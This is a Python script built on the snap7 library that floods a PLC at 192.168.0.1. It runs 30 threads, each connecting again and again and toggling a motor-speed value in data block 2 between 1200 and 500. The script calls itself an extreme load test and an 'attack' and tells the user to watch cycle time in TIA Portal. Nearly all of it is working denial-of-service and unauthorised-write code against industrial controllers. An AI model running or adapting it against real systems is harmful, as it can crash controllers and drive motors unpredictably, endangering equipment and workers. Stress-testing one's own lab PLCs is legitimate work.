import snap7
from snap7.util import *
import threading
import time
import sys

# --- CONFIGURATION ---
PLC_IP = "192.168.0.1" 
RACK = 0
SLOT = 1
NUM_THREADS = 30      
OPERATIONS_PER_CONN = 50  # Number of Read/Write cycles before reconnecting
DB_NUMBER = 2         
READ_SIZE = 4         # Offset 0 to 3 (Motor_ON and Motor_Speed)

def aggressive_worker(thread_id):
    """Each thread rapidly connects, reads, and writes to DB2"""
    while True:
        try:
            plc = snap7.client.Client()
            plc.connect(PLC_IP, RACK, SLOT)
            
            if plc.get_connected():
                for i in range(OPERATIONS_PER_CONN):
                    # 1. READ the current state
                    data = plc.db_read(DB_NUMBER, 0, READ_SIZE)
                    
                    # 2. MODIFY (Toggle speed between two values to force memory updates)
                    current_speed = get_int(data, 2)
                    new_speed = 1200 if current_speed < 1000 else 500
                    
                    write_buffer = bytearray(2)
                    set_int(write_buffer, 0, new_speed)
                    
                    # 3. WRITE the new value back to Offset 2 (Motor_Speed)
                    plc.db_write(DB_NUMBER, 2, write_buffer)
                
                plc.disconnect()
                
                if thread_id % 5 == 0:
                    print(f"[Thread {thread_id}] ⚡ Burst Complete: 50 Read/Write cycles finished.")
            
        except Exception as e:
            # Errors usually mean the PLC connection pool is full
            time.sleep(0.1)

# --- STARTUP ---
print("="*60)
print("🚨 EXTREME LOAD TEST: AGGRESSIVE READ & WRITE FLOOD")
print(f"Target: {PLC_IP} | DB: {DB_NUMBER} | Threads: {NUM_THREADS}")
print("="*60)

confirm = input("This will force the PLC to verify and write data repeatedly. Proceed? (YES): ")
if confirm != "YES":
    sys.exit("Aborted.")

# Launch threads
for i in range(NUM_THREADS):
    t = threading.Thread(target=aggressive_worker, args=(i,), daemon=True)
    t.start()
    time.sleep(0.05) 

print(f"\n🔥 Attack running. Monitor 'Communication Load' and 'Cycle Time' in TIA Portal.")
print("Press Ctrl+C to stop.")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n🛑 Stopped. Cleaning up...")
